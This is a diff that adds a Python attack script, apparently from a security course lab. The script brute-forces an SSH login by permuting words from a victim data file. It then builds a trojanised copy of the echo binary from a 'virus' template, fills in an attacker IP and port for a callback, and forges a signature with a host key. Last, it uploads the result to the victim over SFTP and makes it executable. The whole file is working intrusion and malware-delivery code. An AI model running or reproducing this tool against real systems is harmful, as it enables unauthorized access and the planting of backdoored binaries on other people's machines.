@@ -1,0 +1,97 @@
+#!/usr/bin/env python3
+
+import itertools
+import paramiko
+import sys
+import time
+import subprocess
+import shlex
+
+def crack_ssh_password(victim_ip):
+    with open("/app/victim.dat", 'r') as f:
+        info = f.read().splitlines()
+    for i in range(1, len(info) + 1):
+        for permutation in itertools.permutations(info, i):
+            password = ''.join(permutation)
+            client = ssh_connect(victim_ip, password)
+            if client:
+                return client
+        
+
+def ssh_connect(victim_ip, password):
+    print(f"Trying password: {password}")
+    try:
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        client.connect(hostname=victim_ip, username="csc2025", password=password, timeout=20)
+        print(f"Password: {password} is correct!")
+        return client
+    except paramiko.AuthenticationException:
+        print(f"Password: {password} is incorrect!")
+        return None
+    except Exception as e:
+        print(f"Throw out {e}. Retrying...")
+        time.sleep(1)
+        return ssh_connect(victim_ip, password)
+
+def infect_echo(client, attacker_ip, attacker_port):
+    ret = subprocess.run(shlex.split("stat --format=%s /usr/bin/echo"), capture_output=True, text=True)
+    echo_size = int(ret.stdout)
+    print(f"Ori echo size: {echo_size}")
+    no_sig_size = echo_size - 512
+
+    ret = subprocess.run(shlex.split("zip -q zip_echo /usr/bin/echo"), capture_output=True, text=True)
+    ret = subprocess.run(shlex.split("stat --format=%s zip_echo.zip"), capture_output=True, text=True)
+    zip_echo_size = int(ret.stdout)
+    print(f"Zip echo size: {zip_echo_size}")
+
+    with open("virus", "r") as f:
+        lines = f.readlines()
+    with open("infected_echo", "w") as f:
+        for line in lines:
+            if line.startswith("HOST="):
+                f.write(f'HOST="{attacker_ip}"\n')
+            elif line.startswith("PORT="):
+                f.write(f'PORT="{attacker_port}"\n')
+            elif line.startswith("ZIP_SIZE="):
+                f.write(f'ZIP_SIZE="{zip_echo_size}"\n')
+            else:
+                f.write(line)
+
+    ret = subprocess.run(shlex.split("stat --format=%s infected_echo"), capture_output=True, text=True)
+    virus_size = int(ret.stdout)
+    print(f"Virus size: {virus_size}")
+    
+    ret = subprocess.run(shlex.split("openssl dgst -sign /app/certs/host.key -out signature infected_echo"))
+    ret = subprocess.run(shlex.split("truncate -s 512 signature"), capture_output=True, text=True)
+
+    with open("infected_echo", "a") as f:
+        subprocess.run(shlex.split("cat zip_echo.zip"), stdout=f)
+        subprocess.run(shlex.split(f"truncate -s {no_sig_size} infected_echo"))
+        subprocess.run(shlex.split("cat signature"), stdout=f)
+
+    t = client.get_transport()
+    sftp = paramiko.SFTPClient.from_transport(t)
+    sftp.put("infected_echo", "/app/echo")
+    client.exec_command("chmod +x /app/echo")
+    sftp.close()
+
+def main():
+    if len(sys.argv) != 4:
+        print(f"Usage: {sys.argv[0]} <Victim IP> <Attacker IP> <Attacker port>")
+        sys.exit(1)
+        
+    victim_ip = sys.argv[1]
+    attacker_ip = sys.argv[2]
+    attacker_port = sys.argv[3]
+
+    client = crack_ssh_password(victim_ip)
+    if not client:
+        print("Can not find the password")
+        sys.exit(1)
+    
+    infect_echo(client, attacker_ip, attacker_port)
+    client.close()
+
+if __name__ == "__main__":
+    main()
